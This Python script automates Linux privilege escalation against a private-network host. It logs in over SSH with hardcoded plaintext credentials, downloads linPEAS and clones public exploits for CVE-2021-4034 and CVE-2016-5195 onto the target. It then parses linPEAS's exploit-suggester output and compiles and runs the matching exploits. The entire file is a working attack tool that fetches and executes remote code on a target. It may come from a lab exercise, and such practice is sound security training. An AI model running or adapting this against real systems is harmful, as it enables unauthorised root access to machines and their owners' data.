#!/usr/bin/env python3
import getpass
from fabric import Connection, Config
from time import sleep

CVES = "\n Vulnerabilidades del sistema: \n"
instalados = []

def sshConexion():
    global instalados
    try:
        conexion = Connection(
            host='192.168.1.103',
            user='brain',
            connect_kwargs={"password":'brain.'},
            port=22
        )

        print("-----------------------------------------------------------------")
        print("Conexión establecida e instalación de herramientas")
        print("-----------------------------------------------------------------")
        conexion.run("wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh",hide=True)
        print("Linpeas Instalado")
        conexion.run("git clone https://github.com/berdav/CVE-2021-4034",hide=True)
        instalados.append("CVE-2021-4034")
        print("CVE-2021-4034 clonado")
        conexion.run("git clone https://github.com/gbonacini/CVE-2016-5195",hide=True)
        instalados.append("CVE-2016-5195")
        print("CVE-2016-5195 clonado")
        conexion.run("chmod +x linpeas.sh")
        conexion.run("./linpeas.sh > 317027253_linpeas.txt",hide=True)
        print("317027253_linpeas.txt creado")
        print("-----------------------------------------------------------------")

    except Exception as e:
        print(f"Error al conectarse al servidor SSH: {str(e)}")

def lectura():
    global CVES
    try:
        conexion = Connection(
            host='192.168.1.103',
            user='brain',
            connect_kwargs={"password":'brain.'},
            port=22
        )
        conexion.get("317027253_linpeas.txt")

        texto = open("317027253_linpeas.txt",encoding="utf8")
        for renglon in texto:
            if "Executing Linux Exploit Suggester" in renglon:
                for renglon in texto:
                    if "Executing Linux Exploit Suggester 2" in renglon:
                        break
                    else:
                        if "[CVE" in renglon:
                            CVES+=renglon
        
        print("Ya se tiene la lista de CVEs")
        print("-----------------------------------------------------------------")

    except Exception as e:
        print(f"Error en el archivo: {str(e)}")

def ejecutar():
    global CVES,instalados
    try:
        conexion = Connection(
            host='192.168.1.103',
            user='brain',
            connect_kwargs={"password":'brain.'},
            port=22
        )

        print("Filtrado de los CVES")
        print("-----------------------------------------------------------------")
        vulnes = []
        caracter = ''
        for i in range(len(CVES)):
            if CVES[i]=='C':
                while(CVES[i]!=']'):
                    caracter+=CVES[i]
                    i+=1
                for j in range(len(instalados)):
                    if instalados[j]==caracter:
                        vulnes.append(caracter)
                caracter=''
        
        print(CVES)
        print("Herramientas instaladas:")
        print(vulnes)
    

        print("-----------------------------------------------------------------")
        print("Ejecución de las herramientas")
        print("-----------------------------------------------------------------")
        for vul in vulnes:
            with conexion.cd(vul):
                conexion.run("make > compilacion.txt")
                conexion.run("./"+vul.lower()+" > resultado.txt")

    except Exception as e:
        print(f"Error al ejecutar el script: {str(e)}")

if __name__ == "__main__":
    sshConexion()
    lectura()
    ejecutar()